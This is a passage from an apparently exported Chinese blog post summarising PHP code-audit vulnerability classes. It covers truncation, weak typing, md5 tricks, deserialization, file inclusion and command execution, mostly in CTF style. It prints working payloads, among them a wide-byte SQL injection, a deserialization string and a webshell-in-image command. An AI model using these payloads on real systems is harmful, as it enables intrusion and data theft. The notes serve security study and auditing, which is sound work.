http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*\n#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag\n#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。\n#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 > 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案\n<?php\nif (isset ($_GET['password'])) {\n    if (ereg (\"^[a-zA-Z0-9]+$\",$_GET['password']) === FALSE)    \n       {\n        echo '<p>You password must be alphanumeric</p>';\n    }\n    else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n    {\n        if (strpos ($_GET['password'], '*-*') !== FALSE)\n        {\n            die('Flag: ' . $flag);\n        }\n        else\n        {\n            echo('<p>*-* have not been found</p>');\n        }\n    }\n    else\n    {\n        echo '<p>Invalid password</p>';\n    }\n}\n```\n\n\n### move_uploaded_file 用\\0截断\n5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7\n原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生\ncve：\nhttps://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348\n\n`move_uploaded_file($_FILES['x']['tmp_name'],\"/tmp/test.php\\x00.jpg\")`\n上传抓包修改name为a.php\\0jpg（\\0是nul字符），可以看到$_FILES['xx']['name']存储的字符串是a.php，不会包含\\0截断之后的字符，因此并不影响代码的验证逻辑。\n但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。\n\n### include用？截断\n\n```php\n<?php\n$name=$_GET['name'];  \n$filename=$name.'.php';  \ninclude $filename;  \n?>\n```\n当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。\n测试POC：\nhttp://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?\n则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。\n\n### 系统长度截断\n这种方式在PHP5.3以后的版本中都已经得到了修复。\nwin260个字符，linux下4*1024=4096字节\n\n### mysql长度截断\nmysql内的默认字符长度为255，超过的就没了。\n由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning\n\n### mysql中utf-8截断\n\n`insert into dvwa.test values (14,concat(\"admin\",0xc1,\"abc\"))`\n\n写入为admin\n\n\n## 弱类型比较\n\n原理\n\n比较表：http://php.net/manual/zh/types.comparisons.php\n\n以下等式会成立\n```php\n'' == 0 == false\n'123' == 123\n'abc' == 0\n'123a' == 123\n'0x01' == 1\n'0e123456789' == '0e987654321'\n[false] == [0] == [NULL] == ['']\nNULL == false == 0\ntrue == 1\n```\n\n### ==、>、<的弱类型比较\n\n这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。\n\n```php\n##方法1\n##$a[\"a1\"]=\"1e8%00\";\n##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1\n##方法2\n##$a[\"a1\"]=[\"a\"];\n##使用数组，可以，因为数组恒大于数字或字符串\n##方法3\n##$a[\"a1\"]=1337a;\n##1337a过is_numeric，又由>转成1337与1336比较\n<?php\nis_numeric(@$a[\"a1\"])?die(\"nope\"):NULL;    \nif(@$a[\"a1\"]){\n\t\tvar_dump($a);\n        ($a[\"a1\"]>1336)?$v1=1:NULL;\n}\nvar_dump($v1);\n```\n\n### switch 弱类型\n```php\n// 第一种：弱类型，1e==1\n// $x1=1e\n// 第二种：利用数组名字bypass\n// $x1=1[]\n// 传入后为string(3) \"1[]\",但在switch那里为1\nif (isset($_GET['x1']))\n{ \n        $x1 = $_GET['x1']; \n        $x1==\"1\"?die(\"ha?\"):NULL; \n        switch ($x1) \n        { \n        case 0: \n        case 1: \n                $a=1; \n                break; \n        } \n}\n```\n\n### md5比较（0e相等、数组为Null）\n```php\nmd5('240610708') //0e462097431906509019562988736854\nmd5('QNKCDZO') //0e830400451993494058024219903391\n0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。\nmd5('240610708')==md5('QNKCDZO'); //True\nmd5('240610708')===md5('QNKCDZO'); //False\n\n这样的对应数值还有：\nvar_dump(md5('240610708') == md5('QNKCDZO'));\nvar_dump(md5('aabg7XSs') == md5('aabC9RqS'));\nvar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\nvar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\nvar_dump('0010e2' == '1e3');\nvar_dump('0x1234Ab' == '1193131');\nvar_dump('0xABCdef' == ' 0xABCdef');\n```\n技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串\n\n```php\n#方法1\n#s1=QNKCDZO&s2=240610708\n#方法2\n#?s1[]=1&s2[]=2\n#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null\n#则可以使：[1] !== [2] && md5([1]) ===md5([2])\ndefine('FLAG', 'pwnhub{THIS_IS_FLAG}');\nif ($_GET['s1'] != $_GET['s2']\n&& md5($_GET['s1']) == md5($_GET['s2'])) {\necho \"success, flag:\" . FLAG;\n}\n```\n\n```php\n##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null\n$name = addslashes($_POST['name']);\n$r = $db->get_row(\"SELECT `pass` FROM `user` WHERE `name`='{$name}'\");\nif ($r['pass'] === md5($_POST['pass'])) {\necho \"success\";\n}\n```\n\n### json传数据{\"key\":0}\nPHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。\n```\napplication/x-www-form-urlencoded\nmultipart/form-data\napplication/json\napplication/xml\n```\n第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.\n\n{\"key\":\"0\"}\n\n这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：\n\n{\"key\":0}\n\n### strcmp漏洞1：返回0\n适用与5.3之前版本的php\n\n`int strcmp ( string $str1 , string $str2 )`\n// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。\n当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。\n\n```php\n##flag[]=admin\ndefine('FLAG', 'pwnhub{THIS_IS_FLAG}');\nif (strcmp($_GET['flag'], FLAG) == 0) {\necho \"success, flag:\" . FLAG;\n}\n```\n\n### strcmp漏洞2：返回Null\n修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。\narray和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。\n`strcmp($c[1],$d) `\n\n\n### strcmp漏洞3: 判断使用的是 ==\n\n而判断使用的是==，当NULL==0是 bool(true)\n\n### in_array，array_search 弱类型比较\n\n松散比较下，任何string都等于true：\n\n```php\n// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'\n// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'\n// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.\nif(is_array(@$a[\"a2\"])){\n        if(count($a[\"a2\"])!==5 OR !is_array($a[\"a2\"][0])) die(\"nope\");\n        $pos = array_search(\"ctf\", $a[\"a2\"]);\n        $pos===false?die(\"nope\"):NULL;\n        foreach($a[\"a2\"] as $key=>$val){\n            $val===\"ctf\"?die(\"nope\"):NULL;\n        }\n        $v2=1;\n}\n```\n\n### sha1() md5() 报错相等绕过（False === False）\nsha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false\nmd5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。\n```php\n##?name[]=1&password[]=2\n## === 两边都是false则成立\nif ($_GET['name'] == $_GET['password'])\n    echo '<p>Your password can not be your name!</p>';\nelse if (sha1($_GET['name']) === sha1($_GET['password']))\n    die('Flag: '.$flag);\n```\n\n\n### strpos数组NULL(Null !== False)\n\nstrpos()输入数组出错返回null\n\n```php\n#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.\n<?php\n$flag = \"flag\";\n    if (isset ($_GET['nctf'])) {\n        if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) # %00截断\n            echo '必须输入数字才行';\n        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   \n            die('Flag: '.$flag);\n        else\n            echo '骚年，继续努力吧啊~';\n    }\n```\n\n### 十六进制与十进制比较\n\n== 两边的十六进制与十进制比较，是可以相等的。\n\n```php\n#?password=0xdeadc0de\n#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de\n<?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n    $flag = 'flag{test}';\n    $one = ord('1');  //ord — 返回字符的 ASCII 码值\n    $nine = ord('9'); //ord — 返回字符的 ASCII 码值\n    $number = '3735929054';\n    // Check all the input characters!\n    for ($i = 0; $i < strlen($number); $i++)\n    { \n        // Disallow all the digits!\n        $digit = ord($temp{$i});\n        if ( ($digit >= $one) && ($digit <= $nine) ) ## 1到9不允许，但0允许\n        {\n            // Aha, digit not allowed!\n            return \"flase\";\n        }\n    }\n    if($number == $temp) # \n        return $flag;\n}\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n```\n\n\n## md5注入带入’or’\n原理：\n```php\nmd5(string,raw)\nraw\t可选。规定十六进制或二进制输出格式：\n    TRUE - 原始 16 字符二进制格式\n    FALSE - 默认。32 字符十六进制数\n```\n当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为`'or'<trash>` 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。\n```php\n## 执行顺序:字符串：ffifdyop -> md5()加密成276f722736c95d99e921722cf9ed621c->md5(,true)将16进制转成字符串`'or'<trash>`->sql执行`'or'<trash>`造成注入\n$sql = \"SELECT * FROM admin WHERE username = admin pass = '\".md5($password,true).\"'\";\n```\n\n## switch没有break\n```php\n#这里case 0 和 1 没有break,使得程序继续往下执行。\n<?php\nerror_reporting(0);\nif (isset($_GET['which']))\n{\n    $which = $_GET['which'];\n    switch ($which)\n    {\n    case 0:\n    case 1:\n    case 2:\n        require_once $which.'.php';\n         echo $flag;\n        break;\n    default:\n        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);\n        break;\n    }\n}\n```\n\n## 反序列化\n\n```php\n<!-- index.php -->\n<?php \n\trequire_once('shield.php');\n\t$x = new Shield();\n\tisset($_GET['class']) && $g = $_GET['class'];\n\tif (!empty($g)) {\n\t\t$x = unserialize($g);\n\t}\n\techo $x->readfile();\n?>\n<img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"/>\n<!-- shield.php -->\n<?php\n\t//flag is in pctf.php\n\tclass Shield {\n\t\tpublic $file;\n\t\tfunction __construct($filename = '') {\n\t\t\t$this -> file = $filename;\n\t\t}\n\t\t\n\t\tfunction readfile() {\n\t\t\tif (!empty($this->file) && stripos($this->file,'..')===FALSE  \n\t\t\t&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n\t\t\t\treturn @file_get_contents($this->file);\n\t\t\t}\n\t\t}\n\t}\n?>\n<!-- showimg.php -->\n<?php\n\t$f = $_GET['img'];\n\tif (!empty($f)) {\n\t\t$f = base64_decode($f);\n\t\tif (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\\\')===FALSE\n\t\t//stripos — 查找字符串首次出现的位置（不区分大小写）\n\t\t&& stripos($f,'pctf')===FALSE) {\n\t\t\treadfile($f);\n\t\t} else {\n\t\t\techo \"File not found!\";\n\t\t}\n\t}\n?>\n```\n\n```php\n#?class=O:6:\"Shield\":1:{s:4:\"file\";s:8:\"pctf.php\";}\n<!-- answer.php -->\n<?php\n\nrequire_once('shield.php');\n$x = class Shield();\n$g = serialize($x);\necho $g;\n\n?>\n\n<!-- shield.php -->\n<?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = 'pctf.php') {\n            $this -> file = $filename;\n        }\n        \n        function readfile() {\n            if (!empty($this->file) && stripos($this->file,'..')===FALSE  \n            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n                return @file_get_contents($this->file);\n            }\n        }\n    }\n?>\n```\n\n## 文件包含\n\n原理：\n\ninclude()/include_once()，require()/require_once()，中的变量可控\n\n利用过程：\n```\n上传图片（含有php代码的图片） \n读文件，读php文件 \n包含日志文件getshell \n包含/proc/self/envion文件getshell \n如果有phpinfo可以包含临时文件 \n包含data://或php://input等伪协议（需要allow_url_include=On)\n```\n\n封闭协议：\n```\nfile:// — 访问本地文件系统\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n```\n\n\n```php\n## 访问共享目录\ninclude ('\\evilservershell.php');\n```\n\n\n## 提交参数无过滤\n\n原理:过滤了GPC，但没有过滤其它部分。\n\n```bash\n上传文件相关变量如$_FIle\n$_GET，$_POST，$_Cookie，$_SERVER，$_ENV，$_SESSION，$_REQUEST\nHTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响\n$_HTTP_COOKIE_VARS\n$_HTTP_ENV_VARS\n$_HTTP_GET_VARS\n$_HTTP_POST_FILES\n$_HTTP_POST_VARS\n$_HTTP_SERVER_VARS\n```\n\n案例：\n```php\nforeach($_COOKIE AS $_key=>$_value){\n\tunset($$_key);\n}\nforeach($_POST AS $_key=>$_value){\n\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_POST[$_key];\n}\nforeach($_GET AS $_key=>$_value){\n\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_GET[$_key];\n}\n```\n通过表单来传值。\n```html\n<form method=\"post\" action=\"http://localhost/qibo/member/comment.php?job=ifcom\" enctype=\"multipart/form-data\">\n<input type=\"file\" name=\"cidDB\">  \n<input type=\"submit\">\n</form>\n```\n这里的gid为查询参数\n```php\n$_SERVER                 //中用户能够控制的变量，php5.0后不受GPC影响\nQUERY_STRING             //用户GET方法提交时的查询字符串\nHTTP_REFERER             //用户请求的来源变量，在一些程序取得用户访问记录时用得比较多\nHTTP_USER_AGENT          //用户的浏览器类型，也用于用户的访问记录的取得\nHTTP_HOST                //提交的主机头等内容\nHTTP_X_FORWARDED_FOR     //用户的代理主机的信息\n```\n\n## 伪造IP\n原理:\n以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。\n```php\n关键字：\nHTTP_\ngetenv\n$_SERVER\n服务端：\necho getenv('HTTP_CLIENT_IP');\necho $_SERVER['REMOTE_ADDR']; //访问端（有可能是用户，有可能是代理的）IP\necho $_SERVER['HTTP_CLIENT_IP']; //代理端的（有可能存在，可伪造）\necho $_SERVER['HTTP_X_FORWARDED_FOR']; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）\n客户端：\n注意发送的格式：\nCLIENT-IP:10.10.10.1\nX-FORWARDED-FOR:10.10.10.10\n```\n\n```\n这个玩意恒成立的。不管有没有clientip\n【strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')】\n```\n\n\n## 绕过正则匹配\n\n\n### 缺少^和$限定\n\n\n### 数组绕过正则\n\n【\\A[ _a-zA-Z0-9]+\\z】\n\n\n### str_replace路径穿越\n原理\nstr_replace的过滤方式为其search参数数组从左到右一个一个过滤。\n\n```php\n## 这里可以被绕过，因为是对.和/或\\的组合的过滤，所以单独的..或\\/没有检测到。\n## 方法1\n## 五个点加///\n## 方法2\n## ...././/\n$dir = str_replace(array('..\\\\', '../', './', '.\\\\'), '', trim($dir),$countb);\necho $dir;\necho '</br>替换数量';\necho $countb;\n```\n\n```php\n## 这里有对单独的.进行过滤，所以无法绕过。\n$file = str_replace(array('../', '\\\\', '..'), array('', '/', ''), $_GET['file'],$counta);\necho $file;\necho '</br>替换数量';\necho $counta;\n```\n\n\n## short_open_tag=on 短标签\n\n原理：\n当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；\n格式为：<?xxxx;?> --> <?xxx;\n```bash\nGo0s@ubuntu:~$ cat test.php\n<?=\"helloworld\";\nGo0s@ubuntu:~$ curl 127.0.0.1/test.php\nhelloworld\n```\n\n\n## file_put_contents第二个参数传入数组\n\n原理：\n```php\nfile_put_contents(file,data,mode,context)\nfile\t必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。\ndata\t可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。\n```\n\n```php\n## ?filename=xiaowei.php&data[]=<?php&data[]=%0aphpinfo();\n## 这个要从burp去传，因为后面的【?】会被理解为参数而截断\n<?php\n$a = $_GET['data'];\n$file = $_GET['filename'];\n$current = file_get_contents($file);\nfile_put_contents($file, $a);\n```\n\n\n## 单引号和双引号\n\n原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。\n\n```php\n# 1\n$s = \"I am a 'single quote string' inside a double quote string\"; \n$s = 'I am a \"double quote string\" inside a single quote string'; \n$s = \"I am a 'single quote string' inside a double quote string\"; \n$s = 'I am a \"double quote string\" inside a single quote string';\n# 2\n$abc='I love u'; \necho $abc //结果是:I love u \necho '$abc' //结果是:$abc \necho \"$abc\" //结果是:I love u \n# 3\n$a=\"${@phpinfo()}\"; //可以解析出来\n<?php $a=\"${@phpinfo()}\";?> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\\等\n```\n\n\n### 查询语句缺少单引号\n\n```php\n\"Select * from table where id=$id\" # 有注入\n\"Select * from table where id=\".$id.\" limit 1\" # 有注入\n\"Select * from table where id='$id'\" # 无注入\n\"Select * from table where id='\".$id.\"' limit 1\" # 无注入\n```\n\n## 宽字符注入\n原理\n常见转码函数：\niconv()\nmb_convert_encoding()\naddslashes\n防御：\n用mysql_real_escape_string\n\n```php\n## ?username=tom&password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+\n## %df把\\给吃掉\n$pwd = addslashes($pwd);\nmysql_query(\"SET NAMES gbk\");\n$query = \"select * from user where uname='\".$uname.\"' and pwd='\".$pwd.\"'\";\n```\n\n## 跳转无退出\n原理:\n没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。\n```php\n## 1\n$this->myclass->notice('alert(\"系统已安装过\");window.location.href=\"'.site_url().'\";');\n## 2\nheader(\"location: ../index.php\");\n```\n\n## 二次编码注入\n由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。\n如%2527，两次urldecode会最后变成'\n```\nbase64_decode -- 对使用 MIME base64 编码的数据进行解码\nbase64_encode -- 使用 MIME base64 对数据进行编码\nrawurldecode -- 对已编码的 URL 字符串进行解码\nrawurlencode -- 按照 RFC 1738 对 URL 进行编码\nurldecode -- 解码已编码的 URL 字符串\nurlencode -- 编码 URL 字符串\nunserialize/serialize\n字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等\n```\n\n## 前端可控变量填充导致XSS\n\n当html里的链接是变量时，易出现XSS。\n```html\n={#、echo、print、printf、vprintf、<%=$test%>\nimg scr={#$list.link_logo#}\n```\n\n## 命令执行函数\n\n```php\nsystem()\nexec()\npassthru()\npcntl_exec()\nshell_exec()\necho `whoami`; //反引号调用shell_exec()函数\npopen()和proc_open() //不会返回结果\narray_map($arr,$array); //为数组的每个元素应用回调函数arr,如$arr = \"phpinfo\"\npopen('whoami >>D: /2.txt', 'r'); //这样就会在D下生成一个2.txt。\npreg_replace()\nob_start()\narray_map()\n```\n防范方法：\n使用自定义函数或函数库来替代外部命令的功能\n使用escapeshellarg 函数来处理命令参数\n使用safe_mode_exec_dir 指定可执行文件的路径\n\n### create_function\ncreate_function构造了一个return后面的语句为一个函数。\n```php\n#?sort_by=\"]);}phpinfo();/*\n#sort_function就变成了 return 1 * strnatcasecmp($a[\"\"]);}phpinfo();/*\"], $b[\"\"]);}phpinfo();/*\"]);\n#前面闭合，然后把后面的全部注释掉了。\n<?php\n$sort_by=$_GET['sort_by'];\n$sorter='strnatcasecmp';\n$databases=array('test','test');\n$sort_function = ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';\nusort($databases, create_function('$a, $b', $sort_function));\n```\n\n\n\n### mb_ereg_replace()的/e模式\n原理\n```\nmb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:\nstring mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= \"msr\"  ] )\n当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.\n```\n\n### preg_replace /e模式执行命令\n```php\n# ?str=[phpinfo()]\n# 这里使用/e模式，所以第二个参数\\\\1这里可以执行。\n# 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\\\1，执行。\npreg_replace(\"/\\[(.*)]/e\",'\\\\1',$_GET['str']);\n```\n\n## 动态函数执行\n```php\ncall_user_func\ncall_user_func_array\n```\n\n```php\n# ?a=assert\ncall_user_func($_GET['a'],$b);\n```\n\n\n## 代码执行\n```php\nassert()\ncall_user_func()\ncall_user_func_array()\ncreate_function()\n```\n\n### eval()和assert()代码执行\n\n当assert()的参数为字符串时 可执行PHP代码。\n区别：assert可以不加;，eval不可以不加;。\n```php\neval(\" phpinfo(); \");【√】 eval(\" phpinfo() \");【X】\nassert(\" phpinfo(); \");【√】 assert(\" phpinfo() \");【√】\n```\n\n\n## 优先级绕过\n原理：\n如果运算符优先级相同，那运算符的结合方向决定了该如何运算\nhttp://php.net/manual/zh/language.operators.precedence.php\n\n优先级：&&/|| 大于 = 大于 AND/OR\n\n```php\n# ($test = true) and false; $test2 = (true && false);\n$test = true and false; var_dump($test);//bool(true) \n$test2 = true && false; var_dump($test2); //bool(false)\n\n# 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过\n$test3 = is_numeric(\"123\") and is_numeric(\"anything false\"); var_dump($test3); //bool(true)\n```\n\n## getimagesize图片判断绕过\n原理：\n当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。\n只要我们在文件头部加入GIF89a后可以上传任意后缀文件。\n\n生成小马图的方法：\n```bash\ncat image.png webshell.php > image.php\n```\n\n```php\n## 找上传点\n## 文件头部加入GIF89a\n# 1\n$file = $request->getFiles();\n# 2\nif(getimagesize($files['users']['photo']['tmp_name']))\n        {\n          move_uploaded_file($files['users']['photo']['tmp_name'], $filename);\n# 3\n$filesize = @getimagesize('/path/to/image.png');\nif ($filesize) {\n    do_upload();\n}\n```\n\n## <变*，windows findfirstfile利用\n\n原理：\nWindows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。\n执行过程中，字符\">\"被替换成\"?\"，字符\"<\"被替换成\"*\"，而符号\"（双引号）被替换成一个\".\"字符。\n所以：\n1. \">\"\">>\"可代替一个字符,\"<\"可以代替后缀多个字符，\"<<\"可以代替包括文件名和后缀多个字符。所以一般使用<<\n2. \" 可以代替.\n3. 文件名第一个字符是\".\"的话，读取时可以忽略之\n\n| NO   | Status | Function             | Type of operation      |\n| ---- | ------ | -------------------- | ---------------------- |\n| 1.   | OK     | include()            | Includefile            |\n| 2.   | OK     | include_once()       | Includefile            |\n| 3.   | OK     | require()            | Includefile            |\n| 4.   | OK     | require_once()       | Include file           |\n| 5.   | OK     | fopen()              | Openfile               |\n| 6.   | OK     | ZipArchive::open()   | Archive file           |\n| 7.   | OK     | copy()               | Copyfile               |\n| 8.   | OK     | file_get_contents()  | Readfile               |\n| 9.   | OK     | parse_ini_file()     | Readfile               |\n| 10.  | OK     | readfile()           | Readfile               |\n| 11.  | OK     | file_put_contents()  | Write file             |\n| 12.  | OK     | mkdir()              | New directory creation |\n| 13.  | OK     | tempnam()            | New file creation      |\n| 14.  | OK     | touch()              | New file creation      |\n| 15.  | OK     | move_uploaded_file() | Move operation         |\n| 16.  | OK     | opendiit)            | Directory operation    |\n| 17.  | OK     | readdir()            | Directory operation    |\n| 18.  | OK     | rewinddir()          | Directory operation    |\n| 19.  | OK     | closedir()           | Directory operation    |\n| 20.  | FAIL   | rename()             | Move operation         |\n| 21.  | FAIL   | unlink()             | Delete file            |\n| 22.  | FAIL   | rmdir())             | Directory operation    |\n\n```php\n## ?file=1<\n## ?file=1>\n## ?file=1\"txt\n文件名为1.txt\n\n## ?file=1234.tx>\n## ?file=1234.<\n## ?file=1<<\n## ?file=1<<\">\n## ?file=123>\">\n## ?file=>>>4\">\n## ?file=<<4\">\n文件名为1234.txt\n\ninclude('shell<');  \ninclude('shell<<');\ninclude('shell.p>p'); \ninclude('shell\"php');\nfopen('.htacess');  //==>fopen(\"htacess');\nfile_get_contents('C:boot.ini'); //==>  file_get_contents ('C:/boot.ini');\nfile_get_contents('C:/tmp/con.jpg'); //此举将会无休无止地从CON设备读取0字节，直到遇到eof\nfile_put_contents('C:/tmp/con.jpg',chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音\n```\n\n## 处理value没有处理key\n\nforeach时,addslashes对获得的value值进行处理，但没有处理key。\n\n\n## 用来目录遍历的特别函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094\nlstat 函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071\nstream_resolve_include_path函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453\n\n\n## 绕过GD库图片渲染\n\n[jpg_payload.zip](file/PHP代码审计_jpg_payload.zip)\n\njpg_name.jpg是待GD处理的图片\n```\nphp jpg_payload.php <jpg_name.jpg>\n```\n生成好的图片，在经过如下代码处理后，依然能保留其中的shell：\n\n```php\n<?php\n    imagecreatefromjpeg('xxxx.jpg');\n?>\n```\n\n## 会话固定\n\n```php\nif(!empty($_GET['phpsessid'])) session_id($_GET['phpsessid']);//通过GET方法传递sessionid\n```\n通过get方法来设置session。所以可以通过CSRF：\n\nhttp://xxxx/index.php?r=admin/index/index&phpsessid=f4cking123\n\n管理员点了我们就能使用此session进后台了。\n\n## end方法获取元素的问题\n\n```php\n$file = array(1 => 'png', 0 => 'php');\n\n$ext = $file[count($file) - 1];\n\n$ext = end($file);\n```\n\n两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。前者返回的是$filename[1]也就是png,后者直接返回数组排在最后面的元素php。\n\n## 资料\n\nPHP代码审计分段讲解\n\nhttps://github.com/bowu678/php_bugs\n\nhttps://github.com/jiangsir404/Audit-Learning\n\n\nhttps://read.douban.com/reader/ebook/16642056/","slug":"代码审计","published":1,"updated":"2018-04-25T13:53:15.504Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jq5001aly4jmkcmmnsk","content":"<h1 id=\"PHP代码审计归纳\"><a href=\"#PHP代码审计归纳\" class=\"headerlink\" title=\"PHP代码审计归纳\"></a>PHP代码审计归纳</h1><p>Author: 木禾 ali0th</p>\n<p><a href=\"https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md\" target=\"_blank\" rel=\"noopener\">https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md</a></p>\n<h2 id=\"变量覆盖\"><a href=\"#变量覆盖\" class=\"headerlink\" title=\"变量覆盖\"></a>变量覆盖</h2><h3 id=\"extract\"><a href=\"#extract\" class=\"headerlink\" title=\"extract()\"></a>extract()</h3><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。</p>\n<pre><code class=\"php\">&lt;?php\n$a = &quot;Original&quot;;\n$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);\nextract($my_array); \necho &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;;\n?&gt;\n# 结果：$a = Cat; $b = Dog; $c = Horse\n</code></pre>\n<p>这里原来是\\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。</p>\n<pre><code 